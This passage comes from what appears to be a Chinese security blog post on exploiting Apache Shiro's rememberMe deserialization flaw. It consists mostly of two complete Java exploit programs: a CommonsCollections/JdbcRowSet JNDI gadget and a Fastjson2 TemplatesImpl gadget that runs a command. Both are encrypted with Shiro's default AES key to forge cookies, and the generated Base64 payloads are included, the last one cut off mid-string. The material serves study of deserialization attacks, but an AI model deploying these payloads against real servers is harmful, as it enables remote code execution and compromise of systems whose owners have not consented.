class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CCJNDI</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDatabaseMetaData&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, jdbcRowSet);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,invokerTransformer);<br>        lazyMap.remove(jdbcRowSet);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CC321bytes = baos.toByteArray();<br><br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV 随encrypt一起传输</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] enEvilbytes = cipher.doFinal(CC321bytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + enEvilbytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(enEvilbytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, enEvilbytes.length);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IVandEncryptB64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(IVandEncryptB64);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 模拟 shiro 的解密过程，反序列化验证</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-comment">// base64解码</span><br>        <span class="hljs-type">byte</span>[] IVandEncryptBytes = Base64.decode(IVandEncryptB64);<br>        <span class="hljs-comment">// 拆分IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[] evil = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IVandEncryptBytes.length - deIv.length];<br>        System.arraycopy(IVandEncryptBytes,<span class="hljs-number">0</span>,deIv,<span class="hljs-number">0</span>,deIv.length);<br>        System.arraycopy(IVandEncryptBytes,deIv.length,evil,<span class="hljs-number">0</span>,evil.length);<br>        cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] deEvilBytes = cipher.doFinal(evil);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvilBytes);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BCSiCCjUZj2I2OccLu<span class="hljs-regexp">/h/i</span>BFMCuLAaK+Qzr6jV6+n8rm8vAp3o7q2HqBXHvAtciY4ur4CJ356Mme5jrqdtaI++cjAuJgvjG3cRsWrMSooPDeAci0crfFK+<span class="hljs-number">3</span>Lj3yVUF1Hic+S2UG4nlsv9ixbN2kQ9h2LlMtIcVm6WT6Nr5OSOvVsAwszSf0fjPoz+ZV340lZebku3UTz4947xrVK7P<span class="hljs-regexp">/nbwwFa8XIEJ0yKIQB/</span>sYws6sw2JV4vIWCAwfc+vN2V4z56fT2UVi4k64VXxqNa94C0lKJohsH+ekApS3UO4zu1m8uSAzawBSsA+KaS<span class="hljs-regexp">/Uz/</span>jdkLce6gQnaqHJ7p78wDvsFWeUi6hQMjy5fg1P+<span class="hljs-number">5</span>eBhmovLnC7D0WFj0uoMsbB95FrefRlbHyyTeJs7wDQrRDc8iJOZWC91l+YYNJFTOn2HWJ+<span class="hljs-number">29</span>+LLNKvNClPTis+MXhnnjH+Hj0xyNrXB7S2PB1E0fGDJhiQs98Pqipea5hpDqBBnWrzyezLH+u82k9ZGPnonP4DgEhsEHSDaO2Vw7wTg1+<span class="hljs-number">97</span>NhTC<span class="hljs-regexp">/h9GNGi3bQE21S/</span><span class="hljs-number">3</span>AYJLao0MUtpa52zr837v4HjSmW9f3mJQuQ9GmHmhE8aIlP1zeIn9dGFhJ+LlO+LqTkJMy2MtW9<span class="hljs-regexp">/yGzQmFfmrUwY9FZqk9eC/</span>+<span class="hljs-regexp">/PdkRGyaMn5tqQH1KpcmNkFkuxz9M0RUx63jYL2ffaCj6i5KpESR6xEoc0vvsu4AEgrDbyIJi0budSvG86IBh4sty+X5xuJ3EGplU+yJMi3wz+UrRxCqjX6nflO6xDGJ9dJd0fpBB2ot5HKxnGtRorkqhPFfHrxCxWvsDUvv2ZBNS+g2zcBphPB2/m</span>dG8RcKqAHymGZPDe0+LbLj0a3B8+wXxZtirvPrkeMES7pHjLneZ718cBtfGvx0Chpp02qdTSMcWNB+<span class="hljs-number">7</span>E3Wzr+Vpx2KaRA22RXKACSQhVydwenhCv5nJj2qnMtSYV8sgzWOupyDHW9<span class="hljs-regexp">/Gcec4SFTXgR4hAFH0hFGcuuwOK/</span>lDlO1utPsjqKNxaAmjPWNtunGoRIOTJdu9fmhOuy0fCr3xAdblSCm<span class="hljs-regexp">/mCNdd7QyG7v+d3OOVkct7r937jcIqHe0DiS3BlwCyqP525b1+o9q/</span>sLCbUj+A5b3<span class="hljs-regexp">/Ubss2jFxkFnTL2V07Hmegl11UKTPjYHXzv5zW5K04f/g</span>VQZD+ZY3BtSWxZ6Dg+<span class="hljs-regexp">/6I5clWQDF7b4hBZHCAUDn09bqxXZrdWnYdmyX2IVDMa2bI9oSulYDAMrBSyj7aXUcjVeto/</span>Sc+<span class="hljs-number">52</span>Dl0uBZuGA7b6unOSMP4vAJfvqFSxZhUGjw3OmmnAGFAMZHo5qsABRaog9YECiLewNF7s<span class="hljs-regexp">/aIQQzX3x0enlevOuTH5DqciIohptR2l8T6l6StH7bk5Gr7tIpeEcz4RGlQwcisgNp1RaPuDyMhcmzHq2teP725deD/</span><span class="hljs-number">9</span>bj6ODbTidpB3YnbxBfSs6weHTVt6WpEw6id9IHJyNRYV70NbBYVeukqgSsK8Rg1lc3AHCByTyNCka8kbtZb40zPWKxq+gmSqXwjHvLxLOPEXEBKKfO<span class="hljs-regexp">/KzX0Cf0NEko/</span>GPcBVGxOhLWc0TZuU<span class="hljs-regexp">/taFQIIfS9mP3bB+mqVPdkiRfJaGDpb4udWK4Hds9sxXEiUlKcyvHMg4NWATkCfFBQcyIAK5i0rE+Z0LOTt1Q0H15vcPtW5j9yA/</span>kPUYwfP8olw13dnBOkcqLmvpaBgp7t8UAgb5EhSNPoVqLiFdldzF6ALKwVlUDGiMycnrTOc9LQuKKBnZcn5T0PiL59GcBJIXKF1jQLPXeN+pTwyIO1CPTicPPVjZSqNWKpW2bocHCqgUaeA2Q<span class="hljs-regexp">/4ldwPzatCSEvQAmD4sLfAmLbc/</span><span class="hljs-number">57</span>NXJXznItUAi4mJ4WCKaTU+pv6wQeuj+K2w0HYA9<span class="hljs-regexp">/3je8tvysLI83U84CGgWv3hncZqgSlxw0xAOa4zh1aq43vWPXAO685mFSSkBFa4Ci2pVlk7TFV12dGyhna80NZMErbzSVJ9qukaDB8dJYISDn8n8WJyCwj64mkeyz1gKdkja25epgQf1tJFdYMMwzVDhp68zEjmogFCR5PAzpPq6/</span>zNVArPQlOiFxS4ew0LFQSzabk9kn5RdkIgvv7a0vbjjMYwuu0oOdFLkqH9+s<span class="hljs-regexp">/2s4LKEyb9fpOwZ87Df5UPEmQgKTf670a95TzZilB3WXS/y</span>M4UFZN+gLPF2l56sVQPLdHQPGiFge3NTHKOfW0njMtCh<span class="hljs-regexp">/Qmvi2OqAFeHld4d+27+E1fJtlI8RsdblHfqPCRO7txvhlpNRTjXocE374NF/</span>sYOjUYBoZn1jEZSoJlD74rJW8IYXegRK7ZqL1QnI7PDXLyhesBQOCFKbTVM2O63txORQJEgBl1Zb0entx6BQhmBoxy1JMZwZODXPoAVTNkjkcyHRmlLWWqhZk4oBCCMlm2+FYaXxoJ81Qb7n2UjxvC0lAEOmfz<span class="hljs-regexp">/G+Vhz3gA+0m1s9EHzlRdOGPRfTMsTlltNjQywIX4gQnmsV0P7bq07jVG0SO7aBl/</span><span class="hljs-number">9</span>AhqSmWTMy13VU8qJpDHwCx4tP<span class="hljs-regexp">/+CgLQ0Nn/</span><span class="hljs-number">6</span>W6H84fT2GuGwoSH8=<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421164652463.png" alt="image-20250421164652463"></p><h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p>对于高版本可以选择用 JNDI 绕过的一些手法，我之前在 <a href="https://www.cnblogs.com/LINGX5/p/18780870">这篇文章</a> 也讨论这个话题，这里就不过多赘述了</p><h3 id="Fastjson-链攻击"><a href="#Fastjson-链攻击" class="headerlink" title="Fastjson 链攻击"></a>Fastjson 链攻击</h3><p>我们在之前讲 fastjosn 的时候，审过这样一条链，具体可以看我之前这篇文章：<a href="https://www.cnblogs.com/LINGX5/p/18809006">fastjson 原生反序列化链</a></p><p>当目标有 fastjosn 在版本 1.2.48-2.0.26 之间时</p><p>我们写 payload, 导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime&quot;</span> +<br>                                            <span class="hljs-string">&quot;.AbstractTranslet&quot;</span>));<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object object, String fieldName, Object fieldValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, fieldValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPOC</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        array.add(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(badAttr,<span class="hljs-string">&quot;val&quot;</span>,array);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates, badAttr);<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(getPOC());<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] evilBytes = barr.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] key = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-comment">// 创建 IV</span><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivParameterSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(iv);<br>        <span class="hljs-comment">// 创建密钥</span><br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(key, <span class="hljs-string">&quot;AES&quot;</span>);<br>        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParameterSpec);<br>        <span class="hljs-type">byte</span>[] enBytes = cipher.doFinal(evilBytes);<br>        <span class="hljs-comment">// 拼接 IV 和 加密后的内容</span><br>        <span class="hljs-type">byte</span>[] IVAndEnBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + enBytes.length];<br>        System.arraycopy(iv, <span class="hljs-number">0</span>, IVAndEnBytes, <span class="hljs-number">0</span>, iv.length);<br>        System.arraycopy(enBytes, <span class="hljs-number">0</span>, IVAndEnBytes, iv.length, enBytes.length);<br>        <span class="hljs-comment">// 输出 Base64 编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilBase64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVAndEnBytes);<br>        System.out.println(evilBase64);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * AES解密，模拟shiro反序列化</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 解码 Base64 编码</span><br>        <span class="hljs-type">byte</span>[] decodeBytes = Base64.decode(evilBase64);<br>        <span class="hljs-comment">// 提取 IV</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        System.arraycopy(decodeBytes, <span class="hljs-number">0</span>, deIv, <span class="hljs-number">0</span>, deIv.length);<br>        <span class="hljs-type">byte</span>[] encBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decodeBytes.length - deIv.length];<br>        System.arraycopy(decodeBytes, deIv.length, encBytes, <span class="hljs-number">0</span>, encBytes.length);<br>        <span class="hljs-comment">// 解密</span><br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvParameterSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIv);<br>        cipher.init(Cipher.DECRYPT_MODE, secretKey, deIvParameterSpec);<br>        <span class="hljs-type">byte</span>[] evil = cipher.doFinal(encBytes);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(evil);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10Bp6j65VyUWtxVyYE4il61Wz72<span class="hljs-regexp">/9j9pR2bI9zt1UT3fuJS0J65VDDenY1jZtg/</span>atIMZ+p+RSLOdE3fleOrFMCJxzZJvUH4WqiyimKNvfiTILCnIRbDNjNOhLBVav0QnLcqWWEoJyThGmSrlfDrJOP1rJLyFNhcOmpjnKqhPhTDl2LtenLCardHSUnk1Mp53h6QWoe3OyukgWX7R6<span class="hljs-regexp">/ygPx1zAYusF/</span>PoAAt83QeC1re67H+fZd66t4PkN0d6159+mdLqcZGiiekCmisWpMyiomkHEIPUx8fzEd2avnJe6qy12R7Gi7D4W4b<span class="hljs-regexp">/zl7G1IQyaNka4GrWnlA2XMDaUZlBsrRtzT8htTBZZhtJKDQyFLwk4anK/</span>LBRQ1071fozqukGjgBNHlmj+<span class="hljs-number">4</span>NgCRRSijb<span class="hljs-regexp">/+BJrL0YokSjkiUfdlohqFD8kkYR/</span>U9VZrIGbdoyn158uTlnAEBaz0thjlZPtRr2BPG5tvyqBITrdbN2LOPn0ppG<span class="hljs-regexp">/5kGIdNpHq8TkyfNYZzyB5KwMZOu5tLycy1kR8E3JPzJFiU4pMaWOMEbttNwJ2SR+d/</span>jRvtECEoiIC5KwdzGSWkJU1PSYxO39s+CQnfpk8Oy9innnSdKiOodXQAzF1I5If<span class="hljs-regexp">/rzi6+eqp7+e0URdyoVAMK77iy1H50xKMcxCYWVnbZ9ZQL6leAI7+d/</span>PPyjZ<span class="hljs-regexp">/Wm3YDwJYAdlis88WSfbQxNIf6CsU3b03i00EwQVXaXjoYQiHRDLSR6HMKTSaV3BPshDn8HgECp+R7h81vjyhBaSiARp+/</span>D8fPSBPsSgdGJ3q1dw+NQmlXnYnEb1+nkF4nO6aIYJJ2ae9uTa9A7jJ4cR7mcCr0jncHtlRr8gdhrqrk5dCCdUDE7Hhxz30P19qcIBKNWNaVHL97<span 